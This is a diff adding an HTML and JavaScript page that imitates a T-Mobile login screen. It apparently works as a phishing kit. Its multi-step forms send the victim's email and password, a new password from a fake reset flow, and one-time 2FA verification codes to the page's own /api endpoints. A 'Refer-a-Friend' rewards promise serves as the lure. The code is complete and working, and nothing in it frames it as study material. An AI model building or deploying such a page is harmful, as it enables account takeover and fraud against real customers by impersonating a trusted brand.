@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | T-Mobile</title>
+    <style>
+        :root {
+            --accent: #e20074;
+            --text: #1a1a1a;
+            --muted: #4b4b4b;
+            --border: #c9c9c9;
+            --page-bg: #f4f4f4;
+            --font: "Helvetica Neue", Arial, sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: var(--font);
+            background: var(--page-bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .card {
+            background: #fff;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,.06);
+            padding: 44px 36px 40px;
+        }
+
+        .brand {
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: .04em;
+            color: var(--muted);
+            text-transform: uppercase;
+            margin-bottom: 28px;
+        }
+
+        h1 {
+            font-size: 40px;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            margin-bottom: 28px;
+        }
+
+        .field {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1.5px solid var(--border);
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: var(--font);
+            color: var(--text);
+            margin-bottom: 22px;
+            transition: border-color .15s;
+        }
+
+        .field::placeholder { color: #8a8a8a; }
+        .field:focus { outline: none; border-color: var(--accent); }
+
+        .next-btn {
+            width: 100%;
+            padding: 15px;
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 34px;
+            transition: opacity .15s;
+        }
+
+        .next-btn:hover { opacity: 0.9; }
+        .next-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        .link-row { margin-bottom: 26px; }
+        .link-row:last-child { margin-bottom: 0; }
+
+        .prompt {
+            font-size: 15px;
+            color: var(--text);
+            margin-bottom: 8px;
+        }
+
+        .hint {
+            font-size: 15px;
+            color: var(--muted);
+            margin-bottom: 22px;
+        }
+
+        .pink-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--accent);
+            font-weight: 700;
+            font-size: 15px;
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-family: var(--font);
+            padding: 0;
+        }
+
+        .pink-link:hover { text-decoration: underline; }
+
+        .pink-link svg { width: 16px; height: 16px; }
+
+        .hidden { display: none; }
+
+        .back { margin-top: 22px; }
+
+        .code-box {
+            border: 1.5px dashed var(--accent);
+            border-radius: 12px;
+            padding: 18px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .code-label {
+            display: block;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: .06em;
+            color: var(--muted);
+            margin-bottom: 6px;
+        }
+
+        .code-value {
+            display: block;
+            font-size: 34px;
+            font-weight: 800;
+            letter-spacing: .18em;
+            color: var(--accent);
+            font-variant-numeric: tabular-nums;
+        }
+
+        #boot-error {
+            font-family: monospace;
+            font-size: 12px;
+            color: #b00020;
+            background: #fff5f7;
+            border: 1px solid #f3c2cf;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 18px;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="brand">T-Mobile</div>
+        <div id="boot-error" class="hidden"></div>
+        <h1 id="heading">Log in</h1>
+
+        <!-- step 1: credentials -->
+        <form data-step="login-credentials">
+            <input class="field" type="text" id="email" placeholder="Email or phone number"
+                   autocomplete="username" required>
+            <input class="field" type="password" id="password" placeholder="Password"
+                   autocomplete="current-password" required>
+            <button class="next-btn" type="submit">Next</button>
+
+            <div class="link-row">
+                <p class="prompt">Forgot password?</p>
+                <a class="pink-link" href="#" id="to-reset">Reset your password
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                         stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+                </a>
+            </div>
+        </form>
+
+        <!-- step 2: referral -->
+        <form data-step="login-referral" class="hidden">
+            <p class="hint">Almost there. We just need your referral code.</p>
+            <input class="field" type="text" id="referral" placeholder="Referral code" required>
+            <button class="next-btn" type="submit">Next</button>
+        </form>
+
+        <!-- step 3: 2fa -->
+        <form data-step="login-2fa" class="hidden">
+            <p class="hint">We've sent a 6-digit code to your device.</p>
+            <input class="field" type="text" id="login-code" inputmode="numeric"
+                   placeholder="Enter verification code" required>
+            <button class="next-btn" type="submit">Verify</button>
+
+            <div class="link-row">
+                <p class="prompt">Didn't get a code?</p>
+                <a class="pink-link" href="#" id="resend-code">Resend code
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                         stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+                </a>
+            </div>
+        </form>
+
+        <!-- reset step 1: email -->
+        <form data-step="reset-email" class="hidden">
+            <p class="hint">Enter the email on your account and we'll send you a reset.</p>
+            <input class="field" type="email" id="reset-email-input" placeholder="Email"
+                   autocomplete="email" required>
+            <button class="next-btn" type="submit">Next</button>
+
+            <div class="back">
+                <a class="pink-link" href="#" id="back-to-login">Back to log in</a>
+            </div>
+        </form>
+
+        <!-- reset step 2: new password -->
+        <form data-step="reset-password" class="hidden">
+            <p class="hint">Choose a new password.</p>
+            <input class="field" type="password" id="new-password" placeholder="New password"
+                   autocomplete="new-password" required>
+            <button class="next-btn" type="submit">Next</button>
+        </form>
+
+        <!-- reset step 3: 2fa -->
+        <form data-step="reset-2fa" class="hidden">
+            <p class="hint">We've sent a 6-digit code to your device.</p>
+            <input class="field" type="text" id="reset-code" inputmode="numeric"
+                   placeholder="Enter verification code" required>
+            <button class="next-btn" type="submit">Verify</button>
+        </form>
+
+        <!-- reset step 4: referral -->
+        <form data-step="reset-referral" class="hidden">
+            <p class="hint">Last step. Enter your referral code.</p>
+            <input class="field" type="text" id="reset-referral" placeholder="Referral code" required>
+            <button class="next-btn" type="submit">Next</button>
+        </form>
+
+<!-- success -->
+        <div data-step="success" class="hidden">
+            <p class="hint" id="success-copy"></p>
+
+            <div class="code-box hidden" id="code-box">
+                <span class="code-label">Your referral code</span>
+                <strong class="code-value" id="own-code">------</strong>
+            </div>
+
+            <a class="pink-link" id="to-dashboard" href="/dashboard">Continue to dashboard</a>
+        </div>
+    <script>
+        (function () {
+            'use strict';
+
+            function fail(msg) {
+                var box = document.getElementById('boot-error');
+                if (!box) { alert(msg); return; }
+                box.classList.remove('hidden');
+                box.textContent = String(msg);
+            }
+
+            window.addEventListener('error', function (e) {
+                fail('JS error: ' + e.message + ' (line ' + e.lineno + ')');
+            });
+
+            function boot() {
+                var state = { flow: 'login', id: null, own_code: null };
+
+                var TITLES = {
+                    'login-credentials': 'Log in',
+                    'login-referral': 'Referral code',
+                    'login-2fa': "Verify it's you",
+                    'reset-email': 'Reset your password',
+                    'reset-password': 'New password',
+                    'reset-2fa': "Verify it's you",
+                    'reset-referral': 'Referral code',
+                    'success': "You're all set"
+                };
+
+                var panels = Array.prototype.slice.call(document.querySelectorAll('[data-step]'));
+                var heading = document.getElementById('heading');
+
+                if (!panels.length) { fail('No [data-step] panels found.'); return; }
+
+                // Forms are identified by their data-step value, not an id.
+                function formFor(step) {
+                    return document.querySelector('form[data-step="' + step + '"]');
+                }
+
+                function el(id) {
+                    var node = document.getElementById(id);
+                    if (!node) fail('Missing element: #' + id);
+                    return node;
+                }
+
+                function show(step) {
+                    panels.forEach(function (p) {
+                        p.classList.toggle('hidden', p.dataset.step !== step);
+                    });
+                    heading.textContent = TITLES[step] || 'Log in';
+                    document.title = (TITLES[step] || 'Log in') + ' | T-Mobile';
+                    var first = document.querySelector('[data-step="' + step + '"] .field');
+                    if (first) first.focus();
+                }
+
+                function go(next) {
+                    if (next === 'success') {
+                        var box = el('code-box');
+
+                        if (state.own_code) {
+                            el('own-code').textContent = state.own_code;
+                            el('to-dashboard').href = '/dashboard?code=' + state.own_code;
+                            box.classList.remove('hidden');
+                        } else {
+                            box.classList.add('hidden');
+                        }
+
+                        el('success-copy').textContent =
+                            state.flow === 'reset'
+                                ? 'Your password has been reset and you are now eligible for rewards.'
+                                : 'You are now registered for Refer-a-Friend and eligible for rewards.';
+                        show('success');
+                    } else {
+                        show(state.flow + '-' + next);
+                    }
+                }
+
+                function post(url, body) {
+                    return fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(body)
+                    }).then(function (res) {
+                        return res.json().catch(function () {
+                            return { ok: false, message: 'Bad response from server (HTTP ' + res.status + ').' };
+                        });
+                    });
+                }
+
+                function busy(form, on) {
+                    var btn = form.querySelector('.next-btn');
+                    if (!btn) return;
+                    if (on) {
+                        btn.dataset.label = btn.textContent;
+                        btn.textContent = 'Please wait...';
+                        btn.disabled = true;
+                    } else {
+                        btn.textContent = btn.dataset.label || 'Next';
+                        btn.disabled = false;
+                    }
+                }
+
+                function wire(step, url, payload, done) {
+                    var form = formFor(step);
+                    if (!form) { fail('Missing form for step: ' + step); return; }
+
+                    form.addEventListener('submit', function (e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        busy(form, true);
+
+                        post(url, payload())
+                            .then(function (data) {
+                                if (!data.ok) {
+                                    alert(data.message || 'Something went wrong.');
+                                    busy(form, false);
+                                    return;
+                                }
+                                if (data.id) state.id = data.id;
+                                busy(form, false);
+                                done(data);
+                            })
+                            .catch(function (err) {
+                                console.error(err);
+                                alert('An error occurred. Please try again.');
+                                busy(form, false);
+                            });
+                    });
+                }
+
+                /* ---------------- login flow ---------------- */
+
+                wire('login-credentials', '/api/login', function () {
+                    return {
+                        email: el('email').value.trim(),
+                        password: el('password').value
+                    };
+                }, function (data) {
+                    state.flow = 'login';
+                    go(data.next);
+                });
+
+                wire('login-referral', '/api/referral', function () {
+                    return { id: state.id, referral_code: el('referral').value.trim() };
+                }, function (data) { go(data.next); });
+
+                wire('login-2fa', '/api/2fa', function () {
+                    return { id: state.id, code: el('login-code').value.trim() };
+                }, function (data) {
+                    if (data.own_code) state.own_code = data.own_code;
+                    go(data.next);
+                });
+
+                /* ---------------- reset flow ---------------- */
+
+                wire('reset-email', '/api/reset/start', function () {
+                    return { email: el('reset-email-input').value.trim() };
+                }, function (data) {
+                    state.flow = 'reset';
+                    go(data.next);
+                });
+
+                wire('reset-password', '/api/reset/password', function () {
+                    return { id: state.id, password: el('new-password').value };
+                }, function (data) { go(data.next); });
+
+                wire('reset-2fa', '/api/reset/2fa', function () {
+                    return { id: state.id, code: el('reset-code').value.trim() };
+                }, function (data) { go(data.next); });
+
+                wire('reset-referral', '/api/reset/referral', function () {
+                    return { id: state.id, referral_code: el('reset-referral').value.trim() };
+                }, function (data) {
+                    if (data.own_code) state.own_code = data.own_code;
+                    go(data.next);
+                });
+
+                /* ---------------- links ---------------- */
+
+                el('to-reset').addEventListener('click', function (e) {
+                    e.preventDefault();
+                    state.flow = 'reset';
+                    state.id = null;
+                    history.replaceState(null, '', '/reset');
+                    show('reset-email');
+                });
+
+                el('back-to-login').addEventListener('click', function (e) {
+                    e.preventDefault();
+                    state.flow = 'login';
+                    state.id = null;
+                    history.replaceState(null, '', '/login');
+                    show('login-credentials');
+                });
+
+                el('resend-code').addEventListener('click', function (e) {
+                    e.preventDefault();
+                    if (!state.id) return;
+                    post('/api/resend', { id: state.id, flow: state.flow }).then(function (data) {
+                        alert(data.message || 'Code resent.');
+                    });
+                });
+
+                /* ---------------- boot ---------------- */
+
+                if (location.pathname.replace(/\/+$/, '') === '/reset') {
+                    state.flow = 'reset';
+                    show('reset-email');
+                } else {
+                    show('login-credentials');
+                }
+            }
+
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', boot);
+            } else {
+                boot();
+            }
+        })();
+    </script>
+</body>
+</html>
